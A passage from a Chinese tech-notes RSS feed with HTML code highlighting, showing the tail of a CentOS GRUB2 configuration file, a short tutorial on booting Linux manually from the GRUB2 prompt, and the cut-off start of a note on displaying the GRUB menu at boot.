<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-bios=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-efi=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-baremetal=ahci0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'hd0,msdos2'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	fi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	linux16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /vmlinuz-5.4.119-19-0006</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=UUID=a96bb1f6-5e36-4743-8e86-8d3810f5ba85</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ro</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mgag200.modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ixgbe.allow_unsupported_sfp=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x317</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> intel_iommu=on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iommu=pt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pci=realloc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nousbstorage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crashkernel=auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rhgb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> quiet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	initrd16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /initramfs-5.4.119-19-0006.img</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">menuentry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (3.10.0-1160.el7.x86_64) 7 (Core)'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu-linux</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> os</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --unrestricted</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $menuentry_id_option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'gnulinux-3.10.0-1160.el7.x86_64-advanced-a96bb1f6-5e36-4743-8e86-8d3810f5ba85'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	load_video</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gfxpayload=keep</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gzio</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part_msdos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root='hd0,msdos2'</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_platform_search_hint</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-bios=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-efi=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-baremetal=ahci0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'hd0,msdos2'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	fi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	linux16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /vmlinuz-3.10.0-1160.el7.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=UUID=a96bb1f6-5e36-4743-8e86-8d3810f5ba85</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ro</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mgag200.modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ixgbe.allow_unsupported_sfp=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x317</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> intel_iommu=on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iommu=pt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pci=realloc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nousbstorage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crashkernel=auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rhgb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> quiet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	initrd16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /initramfs-3.10.0-1160.el7.x86_64.img</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">menuentry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (0-rescue-5737ebefe3cb44a2865fe1136b8df871) 7 (Core)'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu-linux</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> os</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --unrestricted</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $menuentry_id_option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'gnulinux-0-rescue-5737ebefe3cb44a2865fe1136b8df871-advanced-a96bb1f6-5e36-4743-8e86-8d3810f5ba85'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	load_video</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gzio</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> part_msdos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	insmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">	set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root='hd0,msdos2'</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$feature_platform_search_hint</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xy ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-bios=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-efi=hd0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint-baremetal=ahci0,msdos2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --hint=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'hd0,msdos2'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	else</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	  search</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-floppy</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --fs-uuid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set=root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cb7790e2-0c09-42e6-88eb-987694de829b</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">	fi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	linux16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /vmlinuz-0-rescue-5737ebefe3cb44a2865fe1136b8df871</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=UUID=a96bb1f6-5e36-4743-8e86-8d3810f5ba85</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ro</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mgag200.modeset=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ixgbe.allow_unsupported_sfp=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vga=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x317</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> intel_iommu=on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iommu=pt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pci=realloc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nousbstorage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> crashkernel=auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rhgb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> quiet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">	initrd16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /initramfs-0-rescue-5737ebefe3cb44a2865fe1136b8df871.img</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"x</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'CentOS Linux (5.4.119-19-0006) 7 (Core)'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> default</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'Advanced options for CentOS Linux&gt;CentOS Linux (5.4.119-19-0006) 7 (Core)'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/10_linux ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/20_linux_xen ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/20_linux_xen ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/20_ppc_terminfo ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/20_ppc_terminfo ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/30_os-prober ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/30_os-prober ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/40_custom ###</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># This file provides an easy way to add custom menu entries.  Simply type the</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># menu entries you want to add after this comment.  Be careful not to change</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># the 'exec tail' line above.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/40_custom ###</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### BEGIN /etc/grub.d/41_custom ###</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-f</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">  ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">config_directory</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/custom.cfg ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  source</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF"> ${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">config_directory</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/custom.cfg</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">elif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [ </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">config_directory</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -f</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  $prefix</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/custom.cfg ]; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  source</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $prefix</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/custom.cfg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/41_custom ###</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Grub2手动引导Linux</title>
      <link>https://www.geekery.cn/note-book/GRUB/Grub2%E6%89%8B%E5%8A%A8%E5%BC%95%E5%AF%BCLinux.html</link>
      <guid>https://www.geekery.cn/note-book/GRUB/Grub2%E6%89%8B%E5%8A%A8%E5%BC%95%E5%AF%BCLinux.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Grub2手动引导Linux</source>
      <description>Grub2手动引导Linux 仅需以下四个步骤完成手动引导： 设置根分区 hd* 表示系统所在的磁盘，编号从0开始。 gpt* 指的是磁盘的分区表格式，其中 * 是具体的分区号。如果使用的是MBR分区表，则应写作 msdos*。 加载内核 第一个参数 /boot/vmlinux* 指向内核文件。 后面接的是内核启动参数，至少需要指定文件系统所在的磁盘和...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>仅需以下四个步骤完成手动引导：</p>
<h2><strong>设置根分区</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hd*,gpt*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li><code>hd*</code> 表示系统所在的磁盘，编号从0开始。</li>
<li><code>gpt*</code> 指的是磁盘的分区表格式，其中 <code>*</code> 是具体的分区号。如果使用的是MBR分区表，则应写作 <code>msdos*</code>。</li>
</ul>
<h2><strong>加载内核</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">linux</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot/vmlinux</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=/dev/sd</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">x</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li>第一个参数 <code>/boot/vmlinux*</code> 指向内核文件。</li>
<li>后面接的是内核启动参数，至少需要指定文件系统所在的磁盘和分区，如 <code>root=/dev/sd*x</code>。</li>
</ul>
<h2><strong>加载初始RAM磁盘（可选）</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">initrd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot/initrd</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li>指定启动过程中使用的初始RAM磁盘映像。在某些情况下，这一步可以省略。</li>
</ul>
<h2><strong>启动系统</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">boot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>提示</strong>：</p>
<ul>
<li>Grub2 支持使用Tab键进行自动补全，当您在输入命令时不确定具体的磁盘分区或文件路径，可以通过按Tab键来获取可能的选项列表，帮助您快速准确地完成输入。</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>开机显示Grub菜单</title>
      <link>https://www.geekery.cn/note-book/GRUB/%E5%BC%80%E6%9C%BA%E6%98%BE%E7%A4%BAGrub%E8%8F%9C%E5%8D%95.html</link>
      <guid>https://www.geekery.cn/note-book/GRUB/%E5%BC%80%E6%9C%BA%E6%98%BE%E7%A4%BAGrub%E8%8F%9C%E5%8D%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">开机显示Grub菜单</source>
      <description>开机显示Grub菜单 开机显示菜单 /etc/default/grub 让用户在Grub开机菜单选定的开机项目自动成为默认值</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>开机显示菜单</h2>
<p>/etc/default/grub</p>
